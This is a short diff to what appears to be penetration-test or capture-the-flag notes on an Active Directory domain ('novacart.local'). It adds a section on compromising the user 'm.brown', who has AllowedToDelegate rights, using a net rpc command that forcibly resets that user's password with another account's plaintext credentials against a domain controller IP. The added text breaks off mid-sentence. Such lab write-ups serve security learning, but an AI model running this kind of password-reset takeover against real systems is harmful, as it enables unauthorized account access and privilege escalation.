@@ -1427,5 +1427,9 @@ The user `m.brown` is the most interesting! They have AllowedToDelegate!
 
 ![](Pasted%20image%2020260503190713.png)
 
+# Compromising `m.brown`
 
-
+```python
+net rpc password "m.brown" 'Password123!' -U "novacart.local"/"andrew.collins"%'administrator38' -S "10.0.18.23"
+```
+This changed the usrs
